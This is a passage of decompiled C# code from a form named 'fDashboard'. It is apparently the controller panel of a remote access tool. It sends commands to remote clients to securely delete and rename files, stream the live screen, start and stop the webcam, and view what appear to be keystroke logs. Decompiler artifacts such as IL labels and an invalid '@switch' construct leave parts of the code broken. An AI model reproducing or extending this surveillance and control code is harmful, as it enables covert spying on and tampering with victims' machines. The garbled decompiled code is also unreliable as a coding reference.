			ConcurrentDictionary<string, CClient> concurrentDictionary;
			checked
			{
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (gclass.Items[i].Selected)
					{
						text = Conversions.ToString(Operators.AddObject(text, Operators.ConcatenateObject(gclass.Items[i].Tag, "|")));
					}
				}
				ConcurrentDictionary<string, CClient> concurrentDictionary_ = Class130.concurrentDictionary_3;
				value = concurrentDictionary_[key = this.string_4];
				string text2 = "files_delete_secure|" + text;
				num2 = 0L;
				ptr = ref text2;
				ptr2 = ref value;
				concurrentDictionary = concurrentDictionary_;
			}
			try
			{
				if (num2 > 0L)
				{
					Thread.Sleep(checked((int)(num2 * 60000L)));
				}
				ptr += "@";
				byte[] bytes = Encoding.UTF8.GetBytes(ptr);
				ptr2.sock_async.method_6(bytes);
				CClient cclient = ptr2;
				ref double ptr3 = ref cclient.stats_bytes_out;
				cclient.stats_bytes_out = ptr3 + (double)ptr.Length;
				ptr3 = ref Class130.struct20_0.double_3;
				Class130.struct20_0.double_3 = ptr3 + (double)ptr.Length;
				ptr3 = ref Class130.struct20_0.double_5;
				Class130.struct20_0.double_5 = ptr3 + 1.0;
			}
			catch (Exception ex)
			{
			}
			concurrentDictionary[key] = value;
			this.vmethod_170().Enabled = false;
			this.vmethod_174().Enabled = false;
			this.vmethod_146().Enabled = false;
		}
	}

	// Token: 0x0600089C RID: 2204 RVA: 0x0004265C File Offset: 0x0004085C
	private void method_63(object sender, EventArgs e)
	{
		string text = string.Empty;
		GClass7 gclass = this.vmethod_720();
		if (gclass.SelectedItems.Count > 0 && MessageBox.Show("Secure delete selected " + Conversions.ToString(gclass.SelectedItems.Count) + " file(s)? [1 Pass]", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
		{
			text = "2|";
			string key;
			CClient value;
			long num2;
			string ptr;
			CClient ptr2;
			ConcurrentDictionary<string, CClient> concurrentDictionary;
			checked
			{
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (gclass.Items[i].Selected)
					{
						text = Conversions.ToString(Operators.AddObject(text, Operators.ConcatenateObject(gclass.Items[i].Tag, "|")));
					}
				}
				ConcurrentDictionary<string, CClient> concurrentDictionary_ = Class130.concurrentDictionary_3;
				value = concurrentDictionary_[key = this.string_4];
				string text2 = "files_delete_secure|" + text;
				num2 = 0L;
				ptr = ref text2;
				ptr2 = ref value;
				concurrentDictionary = concurrentDictionary_;
			}
			try
			{
				if (num2 > 0L)
				{
					Thread.Sleep(checked((int)(num2 * 60000L)));
				}
				ptr += "@";
				byte[] bytes = Encoding.UTF8.GetBytes(ptr);
				ptr2.sock_async.method_6(bytes);
				CClient cclient = ptr2;
				ref double ptr3 = ref cclient.stats_bytes_out;
				cclient.stats_bytes_out = ptr3 + (double)ptr.Length;
				ptr3 = ref Class130.struct20_0.double_3;
				Class130.struct20_0.double_3 = ptr3 + (double)ptr.Length;
				ptr3 = ref Class130.struct20_0.double_5;
				Class130.struct20_0.double_5 = ptr3 + 1.0;
			}
			catch (Exception ex)
			{
			}
			concurrentDictionary[key] = value;
			this.vmethod_170().Enabled = false;
			this.vmethod_174().Enabled = false;
			this.vmethod_146().Enabled = false;
		}
	}

	// Token: 0x0600089D RID: 2205 RVA: 0x00042838 File Offset: 0x00040A38
	private void method_64(object sender, EventArgs e)
	{
		GClass7 gclass = this.vmethod_76();
		if (MessageBox.Show("Secure delete selected directory? [7 passes]", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
		{
			this.vmethod_170().Enabled = false;
			this.vmethod_174().Enabled = false;
			this.vmethod_146().Enabled = false;
			this.vmethod_218().Enabled = false;
			ListViewItem listViewItem;
			string tag = Conversions.ToString((listViewItem = gclass.SelectedItems[0]).Tag);
			long num = 7L;
			this.method_52(ref tag, ref num);
			listViewItem.Tag = tag;
		}
	}

	// Token: 0x0600089E RID: 2206 RVA: 0x000428C8 File Offset: 0x00040AC8
	private void method_65(object sender, EventArgs e)
	{
		if (MessageBox.Show("Delete selected directory? [Normal delete]", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
		{
			GClass7 gclass = this.vmethod_76();
			this.vmethod_170().Enabled = false;
			this.vmethod_174().Enabled = false;
			this.vmethod_146().Enabled = false;
			this.vmethod_218().Enabled = false;
			ListViewItem listViewItem;
			string tag = Conversions.ToString((listViewItem = gclass.SelectedItems[0]).Tag);
			this.method_53(ref tag);
			listViewItem.Tag = tag;
		}
	}

	// Token: 0x0600089F RID: 2207 RVA: 0x0004294C File Offset: 0x00040B4C
	private void method_66(object sender, EventArgs e)
	{
		GClass7 gclass = this.vmethod_76();
		if (MessageBox.Show("Secure delete selected directory? [3 passes]", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
		{
			this.vmethod_170().Enabled = false;
			this.vmethod_174().Enabled = false;
			this.vmethod_146().Enabled = false;
			this.vmethod_218().Enabled = false;
			ListViewItem listViewItem;
			string tag = Conversions.ToString((listViewItem = gclass.SelectedItems[0]).Tag);
			long num = 3L;
			this.method_52(ref tag, ref num);
			listViewItem.Tag = tag;
		}
	}

	// Token: 0x060008A0 RID: 2208 RVA: 0x000429DC File Offset: 0x00040BDC
	private void method_67(object sender, EventArgs e)
	{
		GClass7 gclass = this.vmethod_76();
		if (MessageBox.Show("Secure delete selected directory? [2 passes]", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
		{
			this.vmethod_170().Enabled = false;
			this.vmethod_174().Enabled = false;
			this.vmethod_146().Enabled = false;
			this.vmethod_218().Enabled = false;
			ListViewItem listViewItem;
			string tag = Conversions.ToString((listViewItem = gclass.SelectedItems[0]).Tag);
			long num = 2L;
			this.method_52(ref tag, ref num);
			listViewItem.Tag = tag;
		}
	}

	// Token: 0x060008A1 RID: 2209 RVA: 0x00042A6C File Offset: 0x00040C6C
	private void method_68(object sender, EventArgs e)
	{
		GClass7 gclass = this.vmethod_76();
		if (MessageBox.Show("Secure delete selected directory? [1 pass]", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
		{
			this.vmethod_170().Enabled = false;
			this.vmethod_174().Enabled = false;
			this.vmethod_146().Enabled = false;
			this.vmethod_218().Enabled = false;
			ListViewItem listViewItem;
			string tag = Conversions.ToString((listViewItem = gclass.SelectedItems[0]).Tag);
			long num = 1L;
			this.method_52(ref tag, ref num);
			listViewItem.Tag = tag;
		}
	}

	// Token: 0x060008A2 RID: 2210 RVA: 0x00042AFC File Offset: 0x00040CFC
	private void method_69(object sender, ListViewItemSelectionChangedEventArgs e)
	{
		this.vmethod_116().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_76().SelectedItems.Count > 0, true, false));
		this.vmethod_216().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_76().SelectedItems.Count > 0, true, false));
		this.vmethod_168().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_76().SelectedItems.Count > 0, true, false));
	}

	// Token: 0x060008A3 RID: 2211 RVA: 0x00042BA8 File Offset: 0x00040DA8
	private void method_70(object sender, EventArgs e)
	{
		string left = string.Empty;
		GClass7 gclass = this.vmethod_720();
		checked
		{
			int num = gclass.Items.Count - 1;
			int i = 0;
			while (i <= num)
			{
				if (!gclass.Items[i].Selected)
				{
					i++;
				}
				else
				{
					left = Conversions.ToString(gclass.Items[i].Tag);
					IL_55:
					if (Operators.CompareString(left, string.Empty, true) == 0)
					{
						Interaction.MsgBox("No file selected!", MsgBoxStyle.Exclamation, Application.ProductName);
						return;
					}
					string left2 = Interaction.InputBox("Enter new file name", Application.ProductName, string.Empty, -1, -1);
					if (Operators.CompareString(left2, string.Empty, true) == 0)
					{
						Interaction.MsgBox("Invalid filename!", MsgBoxStyle.Exclamation, Application.ProductName);
						return;
					}
					int num2 = 0;
					ref int ptr = ref num2;
					ref string ptr2 = ref left2;
					string empty = string.Empty;
					string text = ptr2;
					bool flag;
					if (!Information.IsNothing(ptr))
					{
						IEnumerable<char> source = text.Intersect(Path.GetInvalidFileNameChars());
						if (source.Any<char>())
						{
							ptr = Strings.Len(empty) + text.IndexOf(source.First<char>());
							flag = false;
						}
						else
						{
							source = empty.Intersect(Path.GetInvalidPathChars());
							if (source.Any<char>())
							{
								ptr = empty.IndexOf(source.First<char>());
								flag = false;
							}
							else
							{
								flag = true;
							}
						}
					}
					else
					{
						flag = (!text.Intersect(Path.GetInvalidFileNameChars()).Any<char>() && !empty.Intersect(Path.GetInvalidPathChars()).Any<char>());
					}
					if (flag)
					{
						this.method_54(ref left, ref left2);
					}
					else
					{
						Interaction.MsgBox("Invalid filename!", MsgBoxStyle.Exclamation, Application.ProductName);
					}
					return;
				}
			}
			goto IL_55;
		}
	}

	// Token: 0x060008A4 RID: 2212 RVA: 0x00042D40 File Offset: 0x00040F40
	private void method_71(object sender, EventArgs e)
	{
		string left = string.Empty;
		left = Conversions.ToString(this.vmethod_76().SelectedItems[0].Tag);
		if (Operators.CompareString(left, string.Empty, true) == 0)
		{
			Interaction.MsgBox("No directory selected!", MsgBoxStyle.Exclamation, Application.ProductName);
			return;
		}
		string left2 = Interaction.InputBox("Enter new directory name", Application.ProductName, string.Empty, -1, -1);
		if (Operators.CompareString(left2, string.Empty, true) == 0)
		{
			Interaction.MsgBox("Invalid directory name!", MsgBoxStyle.Exclamation, Application.ProductName);
			return;
		}
		int num = 0;
		ref int ptr = ref num;
		ref string ptr2 = ref left2;
		string text = string.Empty;
		string fileName = Path.GetFileName(ptr2);
		text = Path.GetDirectoryName(ptr2);
		bool flag;
		if (!Information.IsNothing(ptr))
		{
			IEnumerable<char> source = fileName.Intersect(Path.GetInvalidFileNameChars());
			if (source.Any<char>())
			{
				ptr = checked(Strings.Len(text) + fileName.IndexOf(source.First<char>()));
				flag = false;
			}
			else
			{
				source = text.Intersect(Path.GetInvalidPathChars());
				if (source.Any<char>())
				{
					ptr = text.IndexOf(source.First<char>());
					flag = false;
				}
				else
				{
					flag = true;
				}
			}
		}
		else
		{
			flag = (!fileName.Intersect(Path.GetInvalidFileNameChars()).Any<char>() && !text.Intersect(Path.GetInvalidPathChars()).Any<char>());
		}
		if (flag)
		{
			this.method_54(ref left, ref left2);
		}
		else
		{
			Interaction.MsgBox("Invalid directory name!", MsgBoxStyle.Exclamation, Application.ProductName);
		}
	}

	// Token: 0x060008A5 RID: 2213 RVA: 0x00042EB0 File Offset: 0x000410B0
	private void method_72(object sender, EventArgs e)
	{
		this.vmethod_86().Enabled = false;
		this.vmethod_88().Enabled = false;
		this.vmethod_686().Enabled = false;
		this.vmethod_82().Enabled = false;
		this.vmethod_688().Enabled = false;
		this.vmethod_96().Enabled = false;
		this.vmethod_94().Enabled = false;
		this.vmethod_292().Enabled = false;
		this.vmethod_98().Enabled = false;
		this.vmethod_100().Enabled = false;
		this.vmethod_246().Checked = false;
		this.vmethod_246().Enabled = false;
		this.vmethod_88().Enabled = false;
		string text = this.string_4;
		string text2 = "monitors_refresh|1";
		string text3 = text;
		Class136.Class138 @class = new Class136.Class138();
		@class.string_0 = text3;
		@class.string_1 = text2;
		@class.long_0 = 0L;
		try
		{
			if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
			{
				new Thread(new ThreadStart(@class._Lambda$__0)).Start();
			}
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x060008A6 RID: 2214 RVA: 0x00002F44 File Offset: 0x00001144
	private void method_73(object sender, ListViewItemSelectionChangedEventArgs e)
	{
	}

	// Token: 0x060008A7 RID: 2215 RVA: 0x00042FD4 File Offset: 0x000411D4
	private void method_74(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.string_4, null, true) != 0)
		{
			string text = this.string_4;
			string text2 = "screenlive_size|" + Conversions.ToString(Conversions.ToInteger(Strings.Replace(this.vmethod_82().Text, "%", string.Empty, 1, -1, CompareMethod.Text)));
			string text3 = text;
			Class136.Class138 @class = new Class136.Class138();
			@class.string_0 = text3;
			@class.string_1 = text2;
			@class.long_0 = 0L;
			try
			{
				if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
				{
					new Thread(new ThreadStart(@class._Lambda$__0)).Start();
				}
			}
			catch (Exception ex)
			{
			}
		}
		this.vmethod_24().Focus();
	}

	// Token: 0x060008A8 RID: 2216 RVA: 0x000430A4 File Offset: 0x000412A4
	private void method_75(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.string_4, null, true) != 0)
		{
			string text = this.string_4;
			string text2 = Conversions.ToString(Operators.ConcatenateObject("screenlive_cursor|", Interaction.IIf(this.vmethod_96().Checked, "1", "0")));
			string text3 = text;
			Class136.Class138 @class = new Class136.Class138();
			@class.string_0 = text3;
			@class.string_1 = text2;
			@class.long_0 = 0L;
			try
			{
				if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
				{
					new Thread(new ThreadStart(@class._Lambda$__0)).Start();
				}
			}
			catch (Exception ex)
			{
			}
		}
		this.vmethod_24().Focus();
	}

	// Token: 0x060008A9 RID: 2217 RVA: 0x0004316C File Offset: 0x0004136C
	private void method_76(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.string_4, null, true) != 0)
		{
			string text = this.string_4;
			string text2 = Conversions.ToString(Operators.ConcatenateObject("screenlive_color|", Interaction.IIf(this.vmethod_98().Checked, "1", "0")));
			string text3 = text;
			Class136.Class138 @class = new Class136.Class138();
			@class.string_0 = text3;
			@class.string_1 = text2;
			@class.long_0 = 0L;
			try
			{
				if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
				{
					new Thread(new ThreadStart(@class._Lambda$__0)).Start();
				}
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x060008AA RID: 2218 RVA: 0x0004316C File Offset: 0x0004136C
	private void method_77(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.string_4, null, true) != 0)
		{
			string text = this.string_4;
			string text2 = Conversions.ToString(Operators.ConcatenateObject("screenlive_color|", Interaction.IIf(this.vmethod_98().Checked, "1", "0")));
			string text3 = text;
			Class136.Class138 @class = new Class136.Class138();
			@class.string_0 = text3;
			@class.string_1 = text2;
			@class.long_0 = 0L;
			try
			{
				if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
				{
					new Thread(new ThreadStart(@class._Lambda$__0)).Start();
				}
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x060008AB RID: 2219 RVA: 0x00043228 File Offset: 0x00041428
	private void method_78(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.string_4, null, true) != 0)
		{
			string text = this.string_4;
			string text2 = "screenlive_monitor|" + Conversions.ToString(this.vmethod_88().SelectedIndex);
			string text3 = text;
			Class136.Class138 @class = new Class136.Class138();
			@class.string_0 = text3;
			@class.string_1 = text2;
			@class.long_0 = 0L;
			try
			{
				if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
				{
					new Thread(new ThreadStart(@class._Lambda$__0)).Start();
				}
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x060008AC RID: 2220 RVA: 0x000432D4 File Offset: 0x000414D4
	private void method_79(object sender, EventArgs e)
	{
		this.vmethod_88().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_246().Enabled, true, false));
		if (this.vmethod_246().Checked)
		{
			this.vmethod_88().Top = 0;
			this.vmethod_250().Enabled = true;
			this.vmethod_250().Visible = true;
		}
		else
		{
			this.vmethod_250().Enabled = false;
			this.vmethod_250().Visible = false;
			this.vmethod_88().Top = 8;
		}
		this.method_80();
	}

	// Token: 0x060008AD RID: 2221 RVA: 0x0004336C File Offset: 0x0004156C
	private void method_80()
	{
		checked
		{
			if (this.vmethod_246().Checked)
			{
				this.vmethod_24().Width = (int)Math.Round(unchecked((double)this.vmethod_22().Width / 2.0 - 2.0));
				this.vmethod_24().Height = this.vmethod_22().Height - 50;
				this.vmethod_248().Left = (int)Math.Round(unchecked((double)this.vmethod_22().Width / 2.0 - 1.0));
				this.vmethod_248().Width = (int)Math.Round(unchecked((double)this.vmethod_22().Width / 2.0 - 1.0));
				this.vmethod_248().Height = this.vmethod_22().Height - 50;
				this.vmethod_248().Visible = true;
				return;
			}
			this.vmethod_24().Height = this.vmethod_22().Height - 50;
			this.vmethod_24().Width = this.vmethod_22().Width - 4;
			this.vmethod_248().Visible = false;
			this.vmethod_264().Height = this.vmethod_252().Height - 50;
			this.vmethod_264().Width = this.vmethod_252().Width - 4;
		}
	}

	// Token: 0x060008AE RID: 2222 RVA: 0x000067DF File Offset: 0x000049DF
	private void method_81(object sender, EventArgs e)
	{
		this.vmethod_18().SelectedIndex = 4;
		this.method_41();
	}

	// Token: 0x060008AF RID: 2223 RVA: 0x000434CC File Offset: 0x000416CC
	private void method_82(object sender, EventArgs e)
	{
		this.vmethod_258().Enabled = false;
		this.vmethod_268().Enabled = false;
		this.vmethod_262().Enabled = false;
		this.vmethod_716().Enabled = false;
		string text = this.string_4;
		string text2 = "webcam_devices|1";
		string text3 = text;
		Class136.Class138 @class = new Class136.Class138();
		@class.string_0 = text3;
		@class.string_1 = text2;
		@class.long_0 = 0L;
		try
		{
			if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
			{
				new Thread(new ThreadStart(@class._Lambda$__0)).Start();
			}
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x060008B0 RID: 2224 RVA: 0x00043584 File Offset: 0x00041784
	private void method_83(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.vmethod_262().Text, "Start", true) == 0)
		{
			try
			{
				Class130.concurrentDictionary_3[this.string_4].WEBCAM_IS_STREAMING = true;
				string text = this.string_4;
				string text2 = string.Concat(new string[]
				{
					"webcam_start|",
					this.string_4,
					"|",
					Conversions.ToString(checked(this.vmethod_268().SelectedIndex + 1)),
					"|",
					Conversions.ToString(this.vmethod_716().Value)
				});
				string text3 = text;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex)
				{
				}
				this.vmethod_262().Text = "Stop";
				this.vmethod_258().Enabled = false;
				this.vmethod_268().Enabled = false;
				return;
			}
			catch (Exception ex2)
			{
				return;
			}
		}
		if (Operators.CompareString(this.vmethod_262().Text, "Stop", true) == 0)
		{
			try
			{
				this.vmethod_262().Enabled = false;
				string text4 = this.string_4;
				string text2 = "webcam_stop|1";
				string text3 = text4;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex3)
				{
				}
				if (Class130.concurrentDictionary_3.ContainsKey(this.string_4) && Class130.concurrentDictionary_3.ContainsKey(Class130.concurrentDictionary_3[this.string_4].WEBCAMSTREAM_SOCKET_ID) && Class130.concurrentDictionary_3.ContainsKey(Class130.concurrentDictionary_3[this.string_4].WEBCAMSTREAM_SOCKET_ID))
				{
					CClient cclient = Class130.concurrentDictionary_3[Class130.concurrentDictionary_3[this.string_4].WEBCAMSTREAM_SOCKET_ID];
					bool flag = true;
					cclient.SOCKET_DISCONNECT(ref flag);
				}
			}
			catch (Exception ex4)
			{
			}
		}
	}

	// Token: 0x060008B1 RID: 2225 RVA: 0x00043844 File Offset: 0x00041A44
	private void method_84(object sender, ListViewItemSelectionChangedEventArgs e)
	{
		this.vmethod_104().Enabled = Conversions.ToBoolean(Interaction.IIf(this.string_8.Length >= 3, true, false));
		this.vmethod_108().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_720().SelectedItems.Count > 0, true, false));
		this.vmethod_144().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_720().SelectedItems.Count > 0, true, false));
		this.vmethod_172().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_720().SelectedItems.Count > 0, true, false));
	}

	// Token: 0x060008B2 RID: 2226 RVA: 0x000067F3 File Offset: 0x000049F3
	private void method_85(object sender, EventArgs e)
	{
		this.vmethod_18().SelectedIndex = 6;
		this.method_41();
	}

	// Token: 0x060008B3 RID: 2227 RVA: 0x00006807 File Offset: 0x00004A07
	private void method_86(object sender, EventArgs e)
	{
		this.vmethod_18().SelectedIndex = 5;
		this.method_41();
	}

	// Token: 0x060008B4 RID: 2228 RVA: 0x00043920 File Offset: 0x00041B20
	public void method_87(ref string string_12)
	{
		if (this.vmethod_388().InvokeRequired)
		{
			this.vmethod_388().Invoke(new fDashboard.Delegate40(this.method_87), new object[]
			{
				string_12
			});
			return;
		}
		string_12 = Encoding.UTF8.GetString(Convert.FromBase64String(string_12));
		this.vmethod_388().Items.Clear();
		this.vmethod_556().Visible = false;
		this.vmethod_556().SendToBack();
		checked
		{
			bool flag;
			bool ptr;
			double num3;
			int num4;
			string text2;
			int num5;
			long num6;
			if (Operators.CompareString(string_12, "0", true) != 0)
			{
				string[] array = Strings.Split(string_12, "|", -1, CompareMethod.Text);
				int num = array.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					if (array[i].Length > 0)
					{
						string[] array2 = Strings.Split(array[i], ":", -1, CompareMethod.Text);
						this.vmethod_388().Items.Add(array2[0], Strings.Replace(array2[0], ".bin", string.Empty, 1, -1, CompareMethod.Text), 0);
						this.vmethod_388().Items[array2[0]].Tag = array2[0];
						ListViewItem.ListViewSubItemCollection subItems = this.vmethod_388().Items[array2[0]].SubItems;
						double num2 = Conversions.ToDouble(array2[1]);
						flag = false;
						ptr = ref flag;
						num3 = num2;
						ListViewItem.ListViewSubItemCollection listViewSubItemCollection = subItems;
						object obj;
						try
						{
							ProjectData.ClearProjectError();
							num4 = 2;
							string text = string.Empty;
							if (num3 >= 1099511627776.0)
							{
								text = Strings.Format(num3 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
							}
							else if (num3 >= 1073741824.0)
							{
								text = Strings.Format(num3 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
							}
							else if (num3 >= 1048576.0)
							{
								text = Strings.Format(num3 / 1024.0 / 1024.0, "#0.00") + " MiB";
							}
							else if (num3 >= 1024.0)
							{
								text = Strings.Format(num3 / 1024.0, "#0.00") + " KiB";
							}
							else if (num3 < 1024.0)
							{
								text = Conversions.ToString(Conversion.Fix(num3)) + " B";
							}
							if (ptr)
							{
								text = Strings.Split(text, " ", -1, CompareMethod.Text)[0];
							}
							if (text.Length > 0)
							{
								text2 = text;
							}
							else
							{
								text2 = " 0 B";
							}
							IL_2A4:
							goto IL_2E9;
							IL_2A6:
							text2 = "0 B";
							goto IL_2A4;
							IL_2AF:
							num5 = -1;
							@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num4);
							IL_2C5:
							goto IL_320;
						}
						catch when (endfilter(obj is Exception & num4 != 0 & num5 == 0))
						{
							Exception ex = (Exception)obj2;
							goto IL_2AF;
						}
						goto IL_2E9;
						IL_320:
						throw ProjectData.CreateProjectError(-2146828237);
						IL_2E9:
						if (num5 != 0)
						{
							ProjectData.ClearProjectError();
						}
						string text3 = text2;
						listViewSubItemCollection.Add(text3);
						num6 = (long)Math.Round(unchecked((double)num6 + Conversion.Val(array2[1])));
					}
				}
			}
			this.vmethod_280().Enabled = true;
			this.vmethod_388().Enabled = true;
			this.vmethod_704().Enabled = true;
			this.vmethod_702().Enabled = true;
			this.vmethod_712().Enabled = true;
			ToolStripStatusLabel toolStripStatusLabel = this.vmethod_484();
			string[] array3 = new string[5];
			array3[0] = "Logs: ";
			array3[1] = Conversions.ToString(this.vmethod_388().Items.Count);
			array3[2] = " (";
			int num7 = 3;
			double num8 = (double)num6;
			flag = false;
			ptr = ref flag;
			num3 = num8;
			int num9 = num7;
			string[] array4 = array3;
			string[] array5 = array3;
			ToolStripStatusLabel toolStripStatusLabel2 = toolStripStatusLabel;
			object obj3;
			try
			{
				ProjectData.ClearProjectError();
				num4 = 2;
				string text = string.Empty;
				if (num3 >= 1099511627776.0)
				{
					text = Strings.Format(num3 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
				}
				else if (num3 >= 1073741824.0)
				{
					text = Strings.Format(num3 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
				}
				else if (num3 >= 1048576.0)
				{
					text = Strings.Format(num3 / 1024.0 / 1024.0, "#0.00") + " MiB";
				}
				else if (num3 >= 1024.0)
				{
					text = Strings.Format(num3 / 1024.0, "#0.00") + " KiB";
				}
				else if (num3 < 1024.0)
				{
					text = Conversions.ToString(Conversion.Fix(num3)) + " B";
				}
				if (ptr)
				{
					text = Strings.Split(text, " ", -1, CompareMethod.Text)[0];
				}
				if (text.Length > 0)
				{
					text2 = text;
				}
				else
				{
					text2 = " 0 B";
				}
				IL_52C:
				goto IL_57C;
				IL_52E:
				text2 = "0 B";
				goto IL_52C;
				IL_537:
				num5 = -1;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num4);
				IL_54D:;
			}
			catch when (endfilter(obj3 is Exception & num4 != 0 & num5 == 0))
			{
				Exception ex2 = (Exception)obj4;
				goto IL_537;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			IL_57C:
			if (num5 != 0)
			{
				ProjectData.ClearProjectError();
			}
			string text4 = text2;
			ToolStripItem toolStripItem = toolStripStatusLabel2;
			string[] array6 = array5;
			array4[num9] = text4;
			array6[4] = ")";
			toolStripItem.Text = string.Concat(array6);
		}
	}

	// Token: 0x060008B5 RID: 2229 RVA: 0x00043F08 File Offset: 0x00042108
	public void method_88(ref string string_12)
	{
		if (this.vmethod_280().InvokeRequired)
		{
			this.vmethod_280().Invoke(new fDashboard.Delegate36(this.method_88), new object[]
			{
				string_12
			});
			return;
		}
		this.vmethod_492().Value = 0;
		this.vmethod_492().Maximum = 100;
		this.vmethod_556().Visible = false;
		this.vmethod_556().SendToBack();
		this.vmethod_290().Value = 0;
		this.vmethod_290().MaximumValue = 100;
		this.vmethod_290().Visible = true;
		this.vmethod_290().ShowText = true;
		checked
		{
			this.vmethod_290().Left = (int)Math.Round(unchecked((double)this.vmethod_280().Left + (double)this.vmethod_280().Width / 2.0 - (double)this.vmethod_290().Width / 2.0));
			this.vmethod_290().Top = (int)Math.Round(unchecked((double)this.vmethod_280().Top + (double)this.vmethod_280().Height / 2.0 - (double)this.vmethod_290().Height / 2.0));
			this.vmethod_282().RunWorkerAsync(string_12);
		}
	}

	// Token: 0x060008B6 RID: 2230 RVA: 0x0004404C File Offset: 0x0004224C
	private void method_89(object sender, DoWorkEventArgs e)
	{
		int num;
		int num5;
		object obj2;
		try
		{
			IL_00:
			ProjectData.ClearProjectError();
			num = 1;
			IL_08:
			int num2 = 2;
			string text = Conversions.ToString(e.Argument);
			IL_17:
			num2 = 3;
			text = Strings.Replace(text, "\0", string.Empty, 1, -1, CompareMethod.Text);
			IL_2F:
			num2 = 4;
			XmlDocument xmlDocument = new XmlDocument();
			IL_38:
			num2 = 5;
			string xml = "<root>" + text + "</root>";
			IL_4D:
			num2 = 6;
			xmlDocument.LoadXml(xml);
			IL_58:
			num2 = 7;
			XmlNodeList elementsByTagName = xmlDocument.GetElementsByTagName("block");
			IL_68:
			num2 = 8;
			this.stringBuilder_0.Clear();
			IL_76:
			num2 = 9;
			this.string_10 = null;
			IL_80:
			num2 = 10;
			this.string_11 = null;
			IL_8A:
			num2 = 11;
			IEnumerator enumerator = elementsByTagName.GetEnumerator();
			checked
			{
				while (enumerator.MoveNext())
				{
					object obj = enumerator.Current;
					XmlNode xmlNode = (XmlNode)obj;
					IL_A7:
					num2 = 12;
					XmlNode xmlNode2 = xmlNode.SelectSingleNode("title");
					IL_B8:
					num2 = 13;
					XmlNode xmlNode3 = xmlNode.SelectSingleNode("date");
					IL_C9:
					num2 = 14;
					XmlNode xmlNode4 = xmlNode.SelectSingleNode("data");
					IL_DA:
					num2 = 15;
					string text2 = string.Empty;
					IL_E3:
					num2 = 16;
					string text3 = string.Empty;
					IL_ED:
					num2 = 17;
					string text4 = string.Empty;
					IL_F7:
					num2 = 18;
					if (xmlNode2 != null)
					{
						IL_FE:
						num2 = 19;
						string @string = Encoding.UTF8.GetString(Convert.FromBase64String(xmlNode2.InnerText));
						text3 = this.method_102(ref @string);
					}
					IL_123:
					num2 = 20;
					if (xmlNode3 != null)
					{
						IL_12A:
						num2 = 21;
						string @string = Encoding.UTF8.GetString(Convert.FromBase64String(xmlNode3.InnerText));
						text2 = this.method_102(ref @string);
					}
					IL_14E:
					num2 = 22;
					if (xmlNode4 != null)
					{
						IL_155:
						num2 = 23;
						string @string = Encoding.UTF8.GetString(Convert.FromBase64String(xmlNode4.InnerText));
						text4 = this.method_102(ref @string);
					}
					IL_17A:
					num2 = 24;
					if (Strings.Len(text2) > 0 & Operators.CompareString(this.string_10, null, true) == 0)
					{
						IL_199:
						num2 = 25;
						this.string_10 = text2;
					}
					IL_1A3:
					num2 = 26;
					if (Strings.Len(text2) > 0)
					{
						IL_1AF:
						num2 = 27;
						this.string_11 = text2;
					}
					IL_1B9:
					num2 = 28;
					if (Strings.Len(text3) > 0)
					{
						IL_1C9:
						num2 = 29;
						if (this.stringBuilder_0.Length > 0)
						{
							IL_1DA:
							num2 = 30;
							this.stringBuilder_0.Append("\r\n\r\n");
						}
						IL_1EE:
						num2 = 31;
						this.stringBuilder_0.Append(text3 + " [" + text2 + "]\r\n");
						IL_20F:
						num2 = 32;
